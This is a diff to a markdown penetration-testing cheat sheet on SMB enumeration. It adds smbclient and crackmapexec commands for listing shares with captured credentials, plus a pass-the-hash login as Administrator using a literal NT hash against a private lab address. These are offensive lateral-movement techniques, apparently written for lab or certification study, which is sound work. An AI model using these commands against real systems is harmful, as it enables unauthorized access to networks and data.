@@ -42,6 +42,7 @@ smbclient -L //<target_ip> -N
 
 **Connect to a share:**
 ```bash
+#Check for anonymous access
 smbclient //<target_ip>/share_name -N
 ```
 
@@ -65,6 +66,16 @@ nmap --script smb-vuln* -p 445 <target_ip>
 crackmapexec smb <target_ip>
 crackmapexec smb <target_ip> --shares
 crackmapexec smb <target_ip> --users
+```
+
+**With users credentials**
+```bash
+# Check shares with credentials you found
+smbclient //<target>/share -U username
+crackmapexec smb <target> -u username -p password --shares
+
+#Using hash (pass-the-hash)
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 ```
 
 **Priority order:**
